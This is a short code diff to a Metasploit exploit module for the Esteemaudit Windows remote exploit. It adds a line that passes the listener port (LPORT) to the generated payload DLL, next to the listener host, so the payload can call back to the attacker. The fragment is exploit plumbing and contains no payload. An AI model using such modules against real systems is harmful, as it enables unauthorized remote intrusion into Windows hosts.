@@ -104,6 +104,7 @@ class MetasploitModule < Msf::Exploit::Remote
   print_status("Generating payload DLL for Esteemaudit")
   pay = framework.modules.create(datastore['payload'])
   pay.datastore['LHOST'] = datastore['LHOST']
+  pay.datastore['LPORT'] = datastore['LPORT']	  
   dll = pay.generate_simple({'Format'=>'dll'})
   File.open(datastore['WINEPATH']+datastore['DLLName'],'w') do |f|
 	print_status("Writing DLL in #{dllpayload}")
